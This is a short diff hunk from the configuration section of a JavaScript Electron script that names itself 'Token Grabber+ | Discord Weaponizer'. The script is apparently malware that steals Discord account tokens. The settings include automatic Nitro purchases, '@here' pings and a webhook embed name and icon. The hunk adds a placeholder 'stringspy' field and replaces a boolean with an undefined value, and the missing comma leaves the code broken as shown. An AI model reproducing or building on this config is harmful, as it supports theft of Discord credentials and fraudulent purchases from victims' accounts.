@@ -6,9 +6,10 @@ const https = require("https");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  auto_buy_nitro: true,
+  auto_buy_nitro: changemeplease,
   ping_on_run: true,
   ping_val: "@here",
+  stringspy: "~~stringspy~~"
   embed_name: "Token Grabber+ | Discord Weaponizer",
   embed_icon:
     "https://cdn.discordapp.com/avatars/928619303257923635/2101f61a8d6b468698893cb0d8677a15.webp",
